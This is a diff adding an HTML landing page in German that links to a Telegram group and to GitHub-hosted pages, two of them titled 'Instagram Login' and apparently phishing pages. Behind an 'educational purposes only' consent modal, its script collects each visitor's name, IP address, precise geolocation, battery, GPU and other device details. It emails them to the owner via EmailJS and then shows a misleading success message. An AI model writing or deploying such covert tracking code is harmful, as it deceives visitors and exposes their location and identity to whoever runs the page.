@@ -1,0 +1,327 @@
+<!doctype html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HIG ABSPEICHERN</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <!-- Tone.js for melody -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.7.77/Tone.min.js"></script>
+    <!-- Font Awesome for Telegram Icon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        /* Google Fonts - Inter */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #1a1a1e;
+        }
+        
+        .backdrop-blur-sm {
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+        }
+        
+        /* Shake animation for error feedback */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        
+        .animate-shake {
+            animation: shake 0.5s ease-in-out;
+        }
+        
+        /* Spinner animation */
+        @keyframes spin {
+            to { transform: rotate(30deg); }
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-left-color: #f0f0f5;
+            animation: spin 1s linear infinite;
+        }
+        
+        /* Style for the status message transitions */
+        #status-message {
+            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
+        }
+
+        /* Custom Scrollbar Styles */
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #2c2c34;
+            border-radius: 10px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #4f46e5; /* indigo-600 */
+            border-radius: 10px;
+        }
+
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: #4338ca; /* indigo-700 */
+        }
+        
+        /* For Firefox */
+        .custom-scrollbar {
+            scrollbar-width: thin;
+            scrollbar-color: #4f46e5 #2c2c34;
+        }
+    </style>
+</head>
+
+<body class="text-gray-200">
+    <!-- Main Content -->
+    <div class="container mx-auto p-4 sm:p-8 text-center flex flex-col items-center justify-center min-h-screen">
+        <h1 class="text-4xl font-bold mb-4">Willkommen</h1>
+        <p class="text-lg mb-8">Alle Higer und seine Gruppe stahlen</p>
+        
+        <!-- Telegram Group Button -->
+        <a href="https://t.me/code_unterstutzung" target="_blank" rel="noopener noreferrer" class="inline-flex items-center justify-center w-full max-w-md px-8 py-4 bg-sky-500 hover:bg-sky-600 text-white font-bold rounded-xl shadow-lg transition-transform transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-sky-400">
+            <i class="fab fa-telegram-plane text-2xl mr-3"></i> Treten Sie unserer Telegram-Gruppe bei
+        </a>
+
+        <!-- Dynamic Link Buttons Container -->
+        <div id="link-buttons" class="w-full max-w-md mt-8">
+            <!-- Buttons will be dynamically inserted here -->
+        </div>
+    </div>
+
+    <!-- Information Modal -->
+    <div id="modal-backdrop" class="fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+        <div id="modal-content" class="bg-[#2c2c34] rounded-2xl shadow-2xl p-8 w-full max-w-md transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-[#f0f0f5] mb-4">Information</h2>
+            <p class="text-center text-[#c0c0c5] mb-6">Alle hier gefundenen Codes, Gruppen und mehr dienen ausschließlich Bildungszwecken. Illegale Handlungen werden nicht gefördert. Akzeptieren Sie, dass Sie keine illegalen Handlungen vornehmen werden?</p>
+            
+            <!-- NAME INPUT FIELD -->
+            <div class="mb-6">
+                 <input type="text" id="visitor-name-input" placeholder="Geben Sie Ihren Namen ein..." class="w-full px-4 py-3 bg-[#1a1a1e] text-white border-2 border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition">
+            </div>
+
+            <div id="error-message" class="hidden text-center text-red-400 mb-4 font-semibold">
+                <!-- Error message will be injected here -->
+            </div>
+
+            <div class="flex justify-center space-x-4">
+                <button id="reject-btn" class="px-6 py-3 bg-gray-600 hover:bg-gray-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-gray-500">Ablehnen</button>
+                <button id="accept-btn" class="px-6 py-3 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-indigo-500">Akzeptieren</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Spinner -->
+    <div id="spinner-overlay" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
+        <div class="spinner w-16 h-16 rounded-full"></div>
+    </div>
+
+    <!-- Status Message (Toast) -->
+    <div id="status-message" class="fixed bottom-5 right-5 p-4 rounded-lg text-white font-bold shadow-lg z-50 opacity-0 transform translate-y-4 pointer-events-none">
+        <!-- Message content will be injected here -->
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const startTime = new Date();
+
+            // --- DYNAMIC BUTTON SYSTEM START ---
+            const links = [
+                { title: "Schah", url: "https://higer23.github.io/Chess/", date: "10.09.2025" },
+                { title: "Instagram Login 1", url: "https://higer23.github.io/Instaagram-Login/", date: "10.09.2025" },
+                { title: "Higer Pong", url: "https://higer23.github.io/ponghig/", date: "10.09.2025" },
+                { title: "Instagram Login 2", url: "https://higer23.github.io/Instagram/", date: "10.09.2025" }
+            ];
+            const linkButtonsContainer = document.getElementById('link-buttons');
+            const generateLinkButtons = () => {
+                if (!linkButtonsContainer) { return; }
+                const scrollableDiv = document.createElement('div');
+                scrollableDiv.className = 'max-h-[400px] overflow-y-auto custom-scrollbar pr-2';
+                const reversedLinks = links.slice().reverse();
+                reversedLinks.forEach(link => {
+                    const button = document.createElement('a');
+                    button.href = link.url;
+                    button.target = '_blank';
+                    button.rel = 'noopener noreferrer';
+                    button.className = "w-full flex flex-col items-center justify-center p-4 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl shadow-lg transition-transform transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-indigo-400 mb-4";
+                    button.innerHTML = `<span class="text-lg font-semibold">${link.title}</span><span class="text-xs text-gray-300 mt-1">${link.date}</span>`;
+                    scrollableDiv.appendChild(button);
+                });
+                linkButtonsContainer.appendChild(scrollableDiv);
+            };
+            generateLinkButtons();
+            // --- DYNAMIC BUTTON SYSTEM END ---
+
+            // --- MODAL AND EMAILJS LOGIC ---
+            const modalBackdrop = document.getElementById('modal-backdrop');
+            const modalContent = document.getElementById('modal-content');
+            const acceptBtn = document.getElementById('accept-btn');
+            const rejectBtn = document.getElementById('reject-btn');
+            const errorMessage = document.getElementById('error-message');
+            const spinnerOverlay = document.getElementById('spinner-overlay');
+            const statusMessage = document.getElementById('status-message');
+            const visitorNameInput = document.getElementById('visitor-name-input');
+            
+            if (!modalBackdrop || !acceptBtn || !rejectBtn || !visitorNameInput) {
+                 console.error("Modal-Komponenten konnten im DOM nicht gefunden werden.");
+                 return;
+            }
+
+            emailjs.init({ publicKey: 'F5cGGWMEHBUJTYWe_' });
+
+            const playSound = async (noteSequence) => {
+                try {
+                    await Tone.start();
+                    const synth = new Tone.Synth().toDestination();
+                    const now = Tone.now();
+                    noteSequence.forEach((note, i) => {
+                        synth.triggerAttackRelease(note.note, note.duration, now + i * 0.2);
+                    });
+                } catch (error) { console.warn("Ton konnte nicht abgespielt werden:", error); }
+            };
+            
+            const shakeModal = (message) => {
+                 errorMessage.textContent = message;
+                 errorMessage.classList.remove('hidden');
+                 modalContent.classList.add('animate-shake');
+                 setTimeout(() => modalContent.classList.remove('animate-shake'), 500);
+            }
+
+            rejectBtn.addEventListener('click', () => {
+                playSound([{note: "C3", duration: "8n"}]);
+                shakeModal("Sie müssen zustimmen, um fortzufahren.");
+            });
+            
+            modalBackdrop.addEventListener('click', (event) => {
+                if (event.target === modalBackdrop) {
+                    playSound([{note: "C3", duration: "8n"}]);
+                    shakeModal("Sie müssen zustimmen, um fortzufahren.");
+                }
+            });
+
+            acceptBtn.addEventListener('click', () => {
+                const visitorName = visitorNameInput.value.trim();
+                if (!visitorName) {
+                    playSound([{note: "C3", duration: "8n"}]);
+                    shakeModal("Bitte geben Sie Ihren Namen ein, um fortzufahren.");
+                    return; 
+                }
+                
+                errorMessage.classList.add('hidden');
+                playSound([
+                    {note: "C4", duration: "8n"}, 
+                    {note: "E4", duration: "8n"}, 
+                    {note: "G4", duration: "8n"}
+                ]);
+                modalBackdrop.classList.add('hidden');
+                spinnerOverlay.classList.remove('hidden');
+                sendDataWithRetry(visitorName);
+            });
+            
+            const showStatusMessage = (message, isSuccess) => {
+                statusMessage.textContent = message;
+                statusMessage.classList.remove('bg-green-600', 'bg-red-600');
+                statusMessage.classList.add(isSuccess ? 'bg-green-600' : 'bg-red-600');
+                statusMessage.classList.remove('opacity-0', 'translate-y-4');
+                setTimeout(() => {
+                    statusMessage.classList.add('opacity-0', 'translate-y-4');
+                }, 4000);
+            };
+
+            const getGpuInfo = () => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) { return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
+                    }
+                    return "WebGL nicht unterstützt";
+                } catch (e) { return "WebGL-Info konnte nicht abgerufen werden"; }
+            };
+
+            const getGeolocation = () => {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) { resolve("Geolocation API nicht unterstützt"); } 
+                    else {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => resolve(`${position.coords.latitude}, ${position.coords.longitude}`),
+                            () => resolve("Standortberechtigung verweigert"),
+                            { timeout: 5000, enableHighAccuracy: true }
+                        );
+                    }
+                });
+            };
+
+            const collectDeviceInfo = async () => {
+                const ipPromise = fetch('https://api.ipify.org?format=json').then(res => res.json());
+                const batteryPromise = 'getBattery' in navigator ? navigator.getBattery() : Promise.resolve(null);
+                const locationPromise = getGeolocation();
+                const [ipData, battery, konum] = await Promise.all([ipPromise, batteryPromise, locationPromise]);
+                const pilSeviyesi = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? 'Lädt' : 'Lädt nicht'})` : "Batterie-API nicht unterstützt";
+                const endTime = new Date();
+                const visitDuration = `${((endTime - startTime) / 1000).toFixed(2)} Sekunden`;
+                return {
+                    ipAdresi: ipData.ip, tarayici: navigator.userAgent, pilDurumu: pilSeviyesi,
+                    tarihSaat: new Date().toLocaleString('de-DE'), isletimSistemi: navigator.platform,
+                    ekranCozunurlugu: `${window.screen.width} x ${window.screen.height}`, tarayiciDili: navigator.language,
+                    cerezDestegi: navigator.cookieEnabled ? 'Ja' : 'Nein', onlineDurumu: navigator.onLine ? 'Online' : 'Offline',
+                    gpuBilgisi: getGpuInfo(), konum: konum, sayfaURL: window.location.href,
+                    referrer: document.referrer || "Direkter Zugriff", ziyaretSuresi: visitDuration,
+                    zamanDilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cpuCekirdekSayisi: navigator.hardwareConcurrency || "Unbekannt",
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unbekannt",
+                };
+            };
+            
+            const sendDataWithRetry = async (visitorName, maxRetries = 3) => {
+                let attempt = 0;
+                while (attempt < maxRetries) {
+                    try {
+                        const deviceInfo = await collectDeviceInfo();
+                        const templateParams = {
+                            visitor_name: visitorName,
+                            time: deviceInfo.tarihSaat,
+                            ip: deviceInfo.ipAdresi,
+                            browser: deviceInfo.tarayici,
+                            battery: deviceInfo.pilDurumu,
+                            platform: deviceInfo.isletimSistemi,
+                            resolution: deviceInfo.ekranCozunurlugu,
+                            language: deviceInfo.tarayiciDili,
+                            cookies: deviceInfo.cerezDestegi,
+                            online: deviceInfo.onlineDurumu,
+                            gpu: deviceInfo.gpuBilgisi,
+                            location: deviceInfo.konum,
+                            duration: deviceInfo.ziyaretSuresi
+                        };
+                        
+                        await emailjs.send('service_5uyhust', 'template_5p9annp', templateParams);
+                        showStatusMessage("System funktioniert einwandfrei. ✅", true);
+                        spinnerOverlay.classList.add('hidden');
+                        return;
+                    } catch (error) {
+                        attempt++;
+                        console.error(`Versuch ${attempt} fehlgeschlagen:`, error);
+                        if (attempt >= maxRetries) {
+                            showStatusMessage("Ein Fehler ist aufgetreten. ❌", false);
+                            spinnerOverlay.classList.add('hidden');
+                        }
+                    }
+                }
+            };
+        });
+    </script>
+</body>
+
+</html>
+
+
